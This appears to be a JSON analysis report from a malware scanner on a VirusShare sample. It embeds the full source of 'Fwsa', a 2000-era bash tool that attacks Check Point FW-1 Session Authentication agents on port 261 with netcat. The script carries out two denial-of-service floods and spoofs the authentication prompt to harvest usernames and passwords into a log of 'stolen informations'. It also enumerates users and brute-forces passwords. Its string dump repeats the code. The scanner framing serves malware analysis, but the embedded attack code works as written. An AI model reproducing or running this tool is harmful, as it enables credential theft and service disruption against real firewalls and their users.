{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "open": "May open a file",
            "run": "May run an executable file or a system command"
        },
        "macro": "#!/bin/bash\n#\n# Fwsa (FW-1 session auth), tested on linux 2.4.0 beta\n# ( Swiss army knife for FW-1 Session authentication. )\n#\n# successfully tested against Session Authentication Agents 4.0 & 4.1\n# and Firewall-1 module 4.0 \n#\n# please don't use it for any illegal activity but only for educational purposes\n#\n#         Gregory Duchemin   ( aka c3rb3r )\n# \n#     for help or bug report <==> c3rb3r@hotmail.com\n\n# 0ctober 2000\n\nfunction Usage()\n{\necho\necho \" Usage: \"$0\" Targets_filez  type_of_attack [FQDN name] [dict file] [0/1/2/3]\"\necho\necho \"================proof of concept // Version 1.0 ===\"\necho \"===================================================\"\necho\necho \" Note: Targets_filez is a plaintext file with all IPs to check\"\necho \"       I recommend u to make it with the help of Nmap \"\necho \"       Try nmap -T Insane -sS -P0 -p 261 RANGE_IP to look for listening session agents.\" \necho \" Note: Type of attack is 1 for password recovery, 2 for stupid DOS, 3 for \"\necho \"       dangerous DOS and 4 for bruteforcing users password on Firewall\"\necho\necho \"       * password recovery will turn you back user FW1 login/password\"\necho \"       * stupid DOS just open a connexion and wait for nothing\"\necho \"         It'll block all other connexion and so, user access.\"\necho \"       * dangerous DOS will enter an infinite loop within it send garbage.\"\necho \"         Will crash some weak systems. ( find wich ones ;) ) \"\necho \"       * passwords Brute-force try to guess users password onto \"\necho \"         the corporate firewall. Have to supply an external address in filez\"\necho \"         to force firewall to connect on local port ( port 261 ).\"\necho\necho \" Note: FQDN name is Fully Qualified Domain name, default:firewall used for FW-1 \"\necho \" banner.\"\necho \" Note: Change the internal variables filez and logfile to store your stock into, default:\\\"...\\\"\"\necho \" Note: this proggy needs netcat to nicely work.\"\necho \necho \" G00d Hunt !\"\necho \necho \" author:  Gregory Duchemin  ( aka c3rb3r )\"\necho \"                          c3rb3r@hotmail.com \"\necho \necho \" N0 c0pyright, feel free to use or modify it as u want\"\necho\n}\n\nsignal_handler()\n{\nsync\necho \necho \"Warning: target aborted, continuing with next one...\"\necho\necho\n}\n\n\nfiltered()\n{\necho\necho \"Error: target port 261 doesn't respond\"\necho \"       it should be because target is filtering or is down.\" \necho \"       Anyway, try again spoofing firewall address.\"\necho \"       Arptool should be helpfull to do the job\"\necho\n}\n\nclosed()\n{\necho\necho \"Error: target port 261 is closed\"\necho \"       continuing with next ip.\" \necho\necho\n}\n\nsimple_dos()\n{\nfor i in $ip; do \necho\necho \"***********************************************\"\necho \"Launching stupid DOS attack against \"$i\" !\"\necho \"***********************************************\"\necho\necho\n{\nsleep $timeout \nsync\n}| nc -n -w 2 -v $i 261 > $logfile 2>&1\nif [ `awk '{ print $7 }' $logfile` = \"refused\" ]; then\nclosed\nelse\nif [ `awk '{ print $7 }' $logfile` = \"timed\" ]; then\nfiltered\nfi\nfi\ndone\nrm $logfile\necho\necho \"DOS terminated. ( Hope it's ok)\"\necho\n}\n\n\ndangerous_dos()\n{\nfor i in $ip; do \necho\necho \"****************************************************\"\necho \"Launching dangerous DOS attack against \"$i\" !\"\necho \"****************************************************\"\necho\necho\n{\nsleep $timeout \ncat /dev/random\n}| nc -n -w 2 -v $i 261  > $logfile 2>&1\nif [ $( awk '{ print $7 }' $logfile) = \"refused\" ]; then\nclosed\nelse \nif [ $(awk '{ print $7 }' $logfile) = \"timed\" ]; then\nfiltered\nfi\nfi\ndone\nrm $logfile\necho\necho \"DOS terminated. ( Hope it's ok)\"\necho\n}\n\n\npassword_recovery()\n{\nfor i in $ip; do \necho\necho \"*****************************************************\"\necho \"Launching FW1 password recovery against \"$i\" !\"\necho \"*****************************************************\"\necho\necho\n{\nsleep $timeout \nsync \ncat /dev/null > $logfile\necho \"220 FW-1 Session Authentication Request from \"$name\necho \"211 253141732 1988 3931424644 80 5\"\necho \"331 User:\"\nsync\n# synchronisation of buffers and disks  \nwhile [ ! -s $logfile ]; do \n# waiting for user info supply in logfile \nsleep 1\ndone\nuser=$(cat $logfile)\n\necho \"331 *Firewall-1 password:\"\n\nwhile [ `wc -l $logfile|awk '{ print $1 }'` -eq 1 ]; do\nsleep 1\ndone\nsed 's/'$user'//' $logfile | sed '/./,$!d' > ./tmp\npassword=$(cat ./tmp)\nrm ./tmp\necho \"200 User $user authenticated by Firewall-1 authentication.\"\necho \"230 OK\"\nsleep 2\necho >> $filez\necho >> $filez\necho \"===== Password recovery ============================================\" >> $filez\necho \"====================================================================\" >> $filez\necho \" Target <==> $i\" >> $filez \necho >> $filez \necho \" Username <==> $user    Password <==> $password\" >> $filez\necho >> $filez \necho >> $filez \nexit 0\n}| nc  -n -w 2 -v $i 261  > $logfile\nif [ -f ./tmp ]; then\nrm tmp\nfi\ndone\nif [ -f $logfile ]; then\nrm $logfile\nfi\necho\necho \"Done. ( see \"$filez\" to read stolen informations)\"\necho\n}\n\n\n\npassword_bruteforce()\n{\nfor i in $ip; do \n\n\necho\necho \"*****************************************************\"\necho \"Launching FW1 password BruteForce attack \"\necho \"*****************************************************\"\necho\necho\n\n\nif [ -s $logfile ]; then\ncat /dev/null > $logfile\nfi\n\n# We use as many char string as there are in password because\n# most of the time, admin won't use a \"real\" random generator but \n# a program that use a basic scheme.\n# if u understand this scheme and modify the string below, u should be able to increase significantly your chances of succeed.  \n# if passwords in your company are less than 8 chars, comment useless lines \n\n# password scheme:\n# for instance, first letter could be uppercase ( A or H string depending on order byte ).\n# initial values are commented\n\n#A='a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 1 2 3 4 5 6 7 8 9 0'\nA='A B C D E F G H I J K L M N O P Q R S T U V W X Y Z'\n\nB='a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 1 2 3 4 5 6 7 8 9 0'\nC='a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 1 2 3 4 5 6 7 8 9 0'\nD='a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 1 2 3 4 5 6 7 8 9 0'\nE='a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 1 2 3 4 5 6 7 8 9 0'\nF='a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 1 2 3 4 5 6 7 8 9 0'\nG='a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 1 2 3 4 5 6 7 8 9 0'\nH='a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 1 2 3 4 5 6 7 8 9 0'\n{\n# we send a probe to anywhere in the world port 80 (or whatever fw rules allow), waiting for FW answer \nnc -w 2 -n $i 80 > /dev/null 2>&1\n\n# waiting for invitation caller  \ngrep 331 $logfile > /dev/null\nwhile [ $? -eq 1 ]; \ndo \ngrep 331 $logfile > /dev/null\ndone\n\n# we try now our login names until we get back the magic cookie\n# actually we read login names in a file, it should be more efficient since most of admins use real names.\n# u can use brute force to guess login in the same manner we use it for passwords.\n# in this case, just change the few lines below to use chars strings from 1 up to 8 loops.\n\nfor user in $username\ndo\ncat /dev/null > $logfile\nsync\necho $user\n\n# 530 eg NOTOK, error response\n# fw1 session authentication reply with an error code if username doesn't exist, that's a flaw in itself.\n\nsleep $timeout \n\ngrep 530 $logfile > /dev/null\nif [ $? -eq 1 ]; then\necho \"===== Password Brute force ============================================\" >> $filez\necho \"====================================================================\" >> $filez\necho >> $filez\necho >> $filez\necho \" login ok :\"$user >> $filez\necho >> $filez\necho >> $filez\necho $user >> ./.users\nsync\ncontinue\nfi\ndone\n\nif [ ! -f ./.users ]; then \nexit\nfi\n\ntargets=`cat ./.users`\nrm ./.users\n \n# Now it's time  we try to guess password for this user\n# if passwords in your company are less than 8 chars, comment useless loops.\n\n\nfor user in $targets\ndo\n \nfor i8 in $H \ndo\nfor i7 in $G\ndo\n\n# this rule is optional\nif [ $i7 = $i8 ]; then\ncontinue\nfi\n\nfor i6 in $F\ndo\n\n# this rule is optional\nif [ $i6 = $i7 ]; then\ncontinue\nfi\n\nfor i5 in $E\ndo\n\n# this rule is optional\nif [ $i5 = $i6 ]; then\ncontinue\nfi\n\nfor i4 in $D \ndo\n\n# this rule is optional\nif [ $i4 = $i5 ]; then\ncontinue\nfi\n\nfor i3 in $C\ndo\n\n# this rule is optional\nif [ $i3 = $i4 ]; then\ncontinue\nfi\n\nfor i2 in $B\ndo\n\n# this rule is optional\nif [ $i2 = $i3 ]; then\ncontinue\nfi\n\nfor i1 in $A\ndo\n\n# this rule is optional\nif [ $i1 = $i2 ]; then\ncontinue\nfi\n\n\n# waiting for server\n\ngrep 331 $logfile > /dev/null\nwhile [ $? -eq 1 ];\ndo \ngrep 331 $logfile > /dev/null\ndone\n\n\n# order is fetched by the user (see usage), and may be usefull for multi-process bruteforce.\n\nif [ $order -eq 0 ]; then\necho $i1$i2$i3$i4$i5$i6$i7$i8\n# for debugging purpose\necho \"trying $i1$i2$i3$i4$i5$i6$i7$i8\" >> $filez\nelse\nif [ $order -eq 1 ]; then\necho $i1$i7$i6$i5$i4$i3$i2$i8\necho \"trying $i1$i7$i6$i5$i4$i3$i2$i8\" >> $filez\nelse\nif [ $order -eq 2 ]; then\necho $i1$i5$i8$i2$i4$i7$i3$i6\necho \"trying $i1$i5$i8$i2$i4$i7$i3$i6\" >> $filez\nelse\necho $i1$i2$i4$i7$i8$i3$i6$i5\necho \"trying $i1$i2$i4$i7$i8$i3$i6$i5\" >> $filez\nfi\nfi\nfi\nsync \nusleep $utimeout \n\n# 230 eg OK, password is correct \n\ngrep 230 $logfile > /dev/null\nif [ $? -eq 0 ]; then\necho >> $filez\nif [ $order -eq 0 ]; then\necho \"password ok :\"$i1$i2$i3$i4$i5$i6$i7$i8 >> $filez\nelse\nif [ $order -eq 1 ]; then\necho \"password ok :\"$i8$i7$i6$i5$i4$i3$i2$i1 >> $filez\nelse\nif [ $order -eq 2 ]; then\necho \"password ok :\"$i8$i5$i1$i2$i4$i7$i3$i6 >> $filez\nelse\necho \"password ok :\"$i2$i1$i4$i7$i8$i3$i6$i5 >> $filez\nfi\nfi\nfi\necho >> $filez\necho >> $filez\nexit\nfi\n\n# we r supposed to reinject username each time, this one we just discovered\n# but connexion is still alive that's the major flaw.\n\ngrep 331 $logfile > /dev/null\nwhile [ $? -eq 1 ];\ndo \ngrep 331 $logfile > /dev/null\ndone\n\necho $user\ndone\ndone\ndone\ndone\ndone\ndone\ndone\ndone\n\ndone\n}| nc  -n  -l -p 261  > $logfile 2>&1\n\n#if [ -f $logfile ]; then\n#rm $logfile\n#fi\ndone\necho\necho \"Done. ( see \"$filez\" to read stolen informations)\"\necho\n}\n\n\n\nif [ $# -lt 2 ]; then\nUsage\nexit\nfi\n\nnc -h  > /dev/null 2>&1\nif [ ! $? -eq 1 ]; then\nUsage\necho\necho\necho \"Error: \"$0\" needs netcat to properly run, please check u have it in your \\$PATH or compile it now.\"\necho\nexit\nfi \n\nif [ ! $2 -eq 1 ] && [ ! $2 -eq 2 ] && [ ! $2 -eq 3 ] && [ ! $2 -eq 4 ]; then\nUsage\necho\necho\necho \"Error: Value for type of attack is out of range.\"\necho\nexit\nfi\n\nif [ ! -s $1 ]; then\nUsage\necho\necho\necho \"Error: \"$0\" didn't find your Targets_ip filez.\"\necho\nexit\nfi\n\ntrap signal_handler SIGINT\n\n\nip=`cat $1`\n\n\n# filez is where results are writen, please change it for your configuration\n# don't forget to change this values for every instance of the process, u would like to launch\nfilez=\"./......\"\nlogfile=\"./logfile4\"\n\ncat /dev/null > $filez\n\nname=\"fwl01\"\n\n# timeout is connexion timer when waiting for a server response.\n\ntimeout=2\n\n\n# utimeout is pretty important, specifically for brute force attack, lower value means faster loop but if too low, fw reply would be mistaken\n# that depends of your network round trip time and average firewall cpu usage.\n# try different values first: default 22 millisecond\n\nutimeout=22000\n\nif [ $# -gt 2 ]; then\nname=$3\nfi\nif [ $# -gt 2 ] && [ $2 -eq 4 ]; then\nif [ ! -s $3 ]; then\nUsage\necho\necho \"Error: \"$0\" didn't find your dict filez or it's empty.\"\necho\nexit\nfi\nusername=`cat $3`\nfi\n\norder=0\nif [ $# -gt 3 ]; then\norder=$4\nfi\n\nif [ -f $logfile ]; then\nrm -f $logfile\nfi\n\ncase \"$2\" in \n1)\n   password_recovery\n   ;;\n\n2)\n  simple_dos\n  ;;\n\n3)\n  dangerous_dos\n  ;;\n\n4)\n  password_bruteforce\n  if [ -s $filez ]; then\n  cat $filez\n  fi\n  ;;\n\n*)\n  exit 1\nesac\nexit\n\n\n\n\n\n"
    },
    "filename": "VirusShare_090d009a4a1ab2f02e4c96beffe6c77a",
    "filesize": 12582,
    "filetype": "Bourne-Again shell script, ASCII text executable, with CRLF line terminators",
    "hashes": {
        "md5": "090d009a4a1ab2f02e4c96beffe6c77a",
        "sha1": "45b66333c02ed4c0f4bc0a85995431f8354c58c9",
        "sha256": "15cc194a3f036e1dad933df40241526b6339084858b3fcaa488cf404942dcee7"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "#!/bin/bash",
            "# Fwsa (FW-1 session auth), tested on linux 2.4.0 beta",
            "# ( Swiss army knife for FW-1 Session authentication. )",
            "# successfully tested against Session Authentication Agents 4.0 & 4.1",
            "# and Firewall-1 module 4.0 ",
            "# please don't use it for any illegal activity but only for educational purposes",
            "#         Gregory Duchemin   ( aka c3rb3r )",
            "#     for help or bug report <==> c3rb3r@hotmail.com",
            "# 0ctober 2000",
            "function Usage()",
            "echo",
            "echo \" Usage: \"$0\" Targets_filez  type_of_attack [FQDN name] [dict file] [0/1/2/3]\"",
            "echo",
            "echo \"================proof of concept // Version 1.0 ===\"",
            "echo \"===================================================\"",
            "echo",
            "echo \" Note: Targets_filez is a plaintext file with all IPs to check\"",
            "echo \"       I recommend u to make it with the help of Nmap \"",
            "echo \"       Try nmap -T Insane -sS -P0 -p 261 RANGE_IP to look for listening session agents.\" ",
            "echo \" Note: Type of attack is 1 for password recovery, 2 for stupid DOS, 3 for \"",
            "echo \"       dangerous DOS and 4 for bruteforcing users password on Firewall\"",
            "echo",
            "echo \"       * password recovery will turn you back user FW1 login/password\"",
            "echo \"       * stupid DOS just open a connexion and wait for nothing\"",
            "echo \"         It'll block all other connexion and so, user access.\"",
            "echo \"       * dangerous DOS will enter an infinite loop within it send garbage.\"",
            "echo \"         Will crash some weak systems. ( find wich ones ;) ) \"",
            "echo \"       * passwords Brute-force try to guess users password onto \"",
            "echo \"         the corporate firewall. Have to supply an external address in filez\"",
            "echo \"         to force firewall to connect on local port ( port 261 ).\"",
            "echo",
            "echo \" Note: FQDN name is Fully Qualified Domain name, default:firewall used for FW-1 \"",
            "echo \" banner.\"",
            "echo \" Note: Change the internal variables filez and logfile to store your stock into, default:\\\"...\\\"\"",
            "echo \" Note: this proggy needs netcat to nicely work.\"",
            "echo ",
            "echo \" G00d Hunt !\"",
            "echo ",
            "echo \" author:  Gregory Duchemin  ( aka c3rb3r )\"",
            "echo \"                          c3rb3r@hotmail.com \"",
            "echo ",
            "echo \" N0 c0pyright, feel free to use or modify it as u want\"",
            "echo",
            "signal_handler()",
            "sync",
            "echo ",
            "echo \"Warning: target aborted, continuing with next one...\"",
            "echo",
            "echo",
            "filtered()",
            "echo",
            "echo \"Error: target port 261 doesn't respond\"",
            "echo \"       it should be because target is filtering or is down.\" ",
            "echo \"       Anyway, try again spoofing firewall address.\"",
            "echo \"       Arptool should be helpfull to do the job\"",
            "echo",
            "closed()",
            "echo",
            "echo \"Error: target port 261 is closed\"",
            "echo \"       continuing with next ip.\" ",
            "echo",
            "echo",
            "simple_dos()",
            "for i in $ip; do ",
            "echo",
            "echo \"***********************************************\"",
            "echo \"Launching stupid DOS attack against \"$i\" !\"",
            "echo \"***********************************************\"",
            "echo",
            "echo",
            "sleep $timeout ",
            "sync",
            "}| nc -n -w 2 -v $i 261 > $logfile 2>&1",
            "if [ `awk '{ print $7 }' $logfile` = \"refused\" ]; then",
            "closed",
            "else",
            "if [ `awk '{ print $7 }' $logfile` = \"timed\" ]; then",
            "filtered",
            "done",
            "rm $logfile",
            "echo",
            "echo \"DOS terminated. ( Hope it's ok)\"",
            "echo",
            "dangerous_dos()",
            "for i in $ip; do ",
            "echo",
            "echo \"****************************************************\"",
            "echo \"Launching dangerous DOS attack against \"$i\" !\"",
            "echo \"****************************************************\"",
            "echo",
            "echo",
            "sleep $timeout ",
            "cat /dev/random",
            "}| nc -n -w 2 -v $i 261  > $logfile 2>&1",
            "if [ $( awk '{ print $7 }' $logfile) = \"refused\" ]; then",
            "closed",
            "else ",
            "if [ $(awk '{ print $7 }' $logfile) = \"timed\" ]; then",
            "filtered",
            "done",
            "rm $logfile",
            "echo",
            "echo \"DOS terminated. ( Hope it's ok)\"",
            "echo",
            "password_recovery()",
            "for i in $ip; do ",
            "echo",
            "echo \"*****************************************************\"",
            "echo \"Launching FW1 password recovery against \"$i\" !\"",
            "echo \"*****************************************************\"",
            "echo",
            "echo",
            "sleep $timeout ",
            "sync ",
            "cat /dev/null > $logfile",
            "echo \"220 FW-1 Session Authentication Request from \"$name",
            "echo \"211 253141732 1988 3931424644 80 5\"",
            "echo \"331 User:\"",
            "sync",
            "# synchronisation of buffers and disks  ",
            "while [ ! -s $logfile ]; do ",
            "# waiting for user info supply in logfile ",
            "sleep 1",
            "done",
            "user=$(cat $logfile)",
            "echo \"331 *Firewall-1 password:\"",
            "while [ `wc -l $logfile|awk '{ print $1 }'` -eq 1 ]; do",
            "sleep 1",
            "done",
            "sed 's/'$user'//' $logfile | sed '/./,$!d' > ./tmp",
            "password=$(cat ./tmp)",
            "rm ./tmp",
            "echo \"200 User $user authenticated by Firewall-1 authentication.\"",
            "echo \"230 OK\"",
            "sleep 2",
            "echo >> $filez",
            "echo >> $filez",
            "echo \"===== Password recovery ============================================\" >> $filez",
            "echo \"====================================================================\" >> $filez",
            "echo \" Target <==> $i\" >> $filez ",
            "echo >> $filez ",
            "echo \" Username <==> $user    Password <==> $password\" >> $filez",
            "echo >> $filez ",
            "echo >> $filez ",
            "exit 0",
            "}| nc  -n -w 2 -v $i 261  > $logfile",
            "if [ -f ./tmp ]; then",
            "rm tmp",
            "done",
            "if [ -f $logfile ]; then",
            "rm $logfile",
            "echo",
            "echo \"Done. ( see \"$filez\" to read stolen informations)\"",
            "echo",
            "password_bruteforce()",
            "for i in $ip; do ",
            "echo",
            "echo \"*****************************************************\"",
            "echo \"Launching FW1 password BruteForce attack \"",
            "echo \"*****************************************************\"",
            "echo",
            "echo",
            "if [ -s $logfile ]; then",
            "cat /dev/null > $logfile",
            "# We use as many char string as there are in password because",
            "# most of the time, admin won't use a \"real\" random generator but ",
            "# a program that use a basic scheme.",
            "# if u understand this scheme and modify the string below, u should be able to increase significantly your chances of succeed.  ",
            "# if passwords in your company are less than 8 chars, comment useless lines ",
            "# password scheme:",
            "# for instance, first letter could be uppercase ( A or H string depending on order byte ).",
            "# initial values are commented",
            "#A='a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 1 2 3 4 5 6 7 8 9 0'",
            "A='A B C D E F G H I J K L M N O P Q R S T U V W X Y Z'",
            "B='a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 1 2 3 4 5 6 7 8 9 0'",
            "C='a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 1 2 3 4 5 6 7 8 9 0'",
            "D='a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 1 2 3 4 5 6 7 8 9 0'",
            "E='a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 1 2 3 4 5 6 7 8 9 0'",
            "F='a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 1 2 3 4 5 6 7 8 9 0'",
            "G='a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 1 2 3 4 5 6 7 8 9 0'",
            "H='a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 1 2 3 4 5 6 7 8 9 0'",
            "# we send a probe to anywhere in the world port 80 (or whatever fw rules allow), waiting for FW answer ",
            "nc -w 2 -n $i 80 > /dev/null 2>&1",
            "# waiting for invitation caller  ",
            "grep 331 $logfile > /dev/null",
            "while [ $? -eq 1 ]; ",
            "grep 331 $logfile > /dev/null",
            "done",
            "# we try now our login names until we get back the magic cookie",
            "# actually we read login names in a file, it should be more efficient since most of admins use real names.",
            "# u can use brute force to guess login in the same manner we use it for passwords.",
            "# in this case, just change the few lines below to use chars strings from 1 up to 8 loops.",
            "for user in $username",
            "cat /dev/null > $logfile",
            "sync",
            "echo $user",
            "# 530 eg NOTOK, error response",
            "# fw1 session authentication reply with an error code if username doesn't exist, that's a flaw in itself.",
            "sleep $timeout ",
            "grep 530 $logfile > /dev/null",
            "if [ $? -eq 1 ]; then",
            "echo \"===== Password Brute force ============================================\" >> $filez",
            "echo \"====================================================================\" >> $filez",
            "echo >> $filez",
            "echo >> $filez",
            "echo \" login ok :\"$user >> $filez",
            "echo >> $filez",
            "echo >> $filez",
            "echo $user >> ./.users",
            "sync",
            "continue",
            "done",
            "if [ ! -f ./.users ]; then ",
            "exit",
            "targets=`cat ./.users`",
            "rm ./.users",
            "# Now it's time  we try to guess password for this user",
            "# if passwords in your company are less than 8 chars, comment useless loops.",
            "for user in $targets",
            "for i8 in $H ",
            "for i7 in $G",
            "# this rule is optional",
            "if [ $i7 = $i8 ]; then",
            "continue",
            "for i6 in $F",
            "# this rule is optional",
            "if [ $i6 = $i7 ]; then",
            "continue",
            "for i5 in $E",
            "# this rule is optional",
            "if [ $i5 = $i6 ]; then",
            "continue",
            "for i4 in $D ",
            "# this rule is optional",
            "if [ $i4 = $i5 ]; then",
            "continue",
            "for i3 in $C",
            "# this rule is optional",
            "if [ $i3 = $i4 ]; then",
            "continue",
            "for i2 in $B",
            "# this rule is optional",
            "if [ $i2 = $i3 ]; then",
            "continue",
            "for i1 in $A",
            "# this rule is optional",
            "if [ $i1 = $i2 ]; then",
            "continue",
            "# waiting for server",
            "grep 331 $logfile > /dev/null",
            "while [ $? -eq 1 ];",
            "grep 331 $logfile > /dev/null",
            "done",
            "# order is fetched by the user (see usage), and may be usefull for multi-process bruteforce.",
            "if [ $order -eq 0 ]; then",
            "echo $i1$i2$i3$i4$i5$i6$i7$i8",
            "# for debugging purpose",
            "echo \"trying $i1$i2$i3$i4$i5$i6$i7$i8\" >> $filez",
            "else",
            "if [ $order -eq 1 ]; then",
            "echo $i1$i7$i6$i5$i4$i3$i2$i8",
            "echo \"trying $i1$i7$i6$i5$i4$i3$i2$i8\" >> $filez",
            "else",
            "if [ $order -eq 2 ]; then",
            "echo $i1$i5$i8$i2$i4$i7$i3$i6",
            "echo \"trying $i1$i5$i8$i2$i4$i7$i3$i6\" >> $filez",
            "else",
            "echo $i1$i2$i4$i7$i8$i3$i6$i5",
            "echo \"trying $i1$i2$i4$i7$i8$i3$i6$i5\" >> $filez",
            "sync ",
            "usleep $utimeout ",
            "# 230 eg OK, password is correct ",
            "grep 230 $logfile > /dev/null",
            "if [ $? -eq 0 ]; then",
            "echo >> $filez",
            "if [ $order -eq 0 ]; then",
            "echo \"password ok :\"$i1$i2$i3$i4$i5$i6$i7$i8 >> $filez",
            "else",
            "if [ $order -eq 1 ]; then",
            "echo \"password ok :\"$i8$i7$i6$i5$i4$i3$i2$i1 >> $filez",
            "else",
            "if [ $order -eq 2 ]; then",
            "echo \"password ok :\"$i8$i5$i1$i2$i4$i7$i3$i6 >> $filez",
            "else",
            "echo \"password ok :\"$i2$i1$i4$i7$i8$i3$i6$i5 >> $filez",
            "echo >> $filez",
            "echo >> $filez",
            "exit",
            "# we r supposed to reinject username each time, this one we just discovered",
            "# but connexion is still alive that's the major flaw.",
            "grep 331 $logfile > /dev/null",
            "while [ $? -eq 1 ];",
            "grep 331 $logfile > /dev/null",
            "done",
            "echo $user",
            "done",
            "done",
            "done",
            "done",
            "done",
            "done",
            "done",
            "done",
            "done",
            "}| nc  -n  -l -p 261  > $logfile 2>&1",
            "#if [ -f $logfile ]; then",
            "#rm $logfile",
            "done",
            "echo",
            "echo \"Done. ( see \"$filez\" to read stolen informations)\"",
            "echo",
            "if [ $# -lt 2 ]; then",
            "Usage",
            "exit",
            "nc -h  > /dev/null 2>&1",
            "if [ ! $? -eq 1 ]; then",
            "Usage",
            "echo",
            "echo",
            "echo \"Error: \"$0\" needs netcat to properly run, please check u have it in your \\$PATH or compile it now.\"",
            "echo",
            "exit",
            "if [ ! $2 -eq 1 ] && [ ! $2 -eq 2 ] && [ ! $2 -eq 3 ] && [ ! $2 -eq 4 ]; then",
            "Usage",
            "echo",
            "echo",
            "echo \"Error: Value for type of attack is out of range.\"",
            "echo",
            "exit",
            "if [ ! -s $1 ]; then",
            "Usage",
            "echo",
            "echo",
            "echo \"Error: \"$0\" didn't find your Targets_ip filez.\"",
            "echo",
            "exit",
            "trap signal_handler SIGINT",
            "ip=`cat $1`",
            "# filez is where results are writen, please change it for your configuration",
            "# don't forget to change this values for every instance of the process, u would like to launch",
            "filez=\"./......\"",
            "logfile=\"./logfile4\"",
            "cat /dev/null > $filez",
            "name=\"fwl01\"",
            "# timeout is connexion timer when waiting for a server response.",
            "timeout=2",
            "# utimeout is pretty important, specifically for brute force attack, lower value means faster loop but if too low, fw reply would be mistaken",
            "# that depends of your network round trip time and average firewall cpu usage.",
            "# try different values first: default 22 millisecond",
            "utimeout=22000",
            "if [ $# -gt 2 ]; then",
            "name=$3",
            "if [ $# -gt 2 ] && [ $2 -eq 4 ]; then",
            "if [ ! -s $3 ]; then",
            "Usage",
            "echo",
            "echo \"Error: \"$0\" didn't find your dict filez or it's empty.\"",
            "echo",
            "exit",
            "username=`cat $3`",
            "order=0",
            "if [ $# -gt 3 ]; then",
            "order=$4",
            "if [ -f $logfile ]; then",
            "rm -f $logfile",
            "case \"$2\" in ",
            "   password_recovery",
            "   ;;",
            "  simple_dos",
            "  ;;",
            "  dangerous_dos",
            "  ;;",
            "  password_bruteforce",
            "  if [ -s $filez ]; then",
            "  cat $filez",
            "  fi",
            "  ;;",
            "  exit 1",
            "esac",
            "exit"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.353166",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
